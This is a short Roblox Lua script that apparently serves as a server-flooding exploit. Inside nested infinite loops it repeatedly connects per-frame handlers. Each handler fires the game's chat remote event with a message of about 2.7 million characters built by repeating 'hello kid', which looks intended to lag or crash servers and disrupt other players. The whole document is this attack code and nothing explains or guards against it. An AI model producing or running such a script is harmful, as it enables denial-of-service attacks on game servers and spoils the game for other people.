while true do
wait()
while true do            
wait()
for i=1, 100 do
local msg = "/e "..string.rep("hello kid",301056)
game:GetService("RunService").RenderStepped:Connect(function()
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
end)
end
end
end
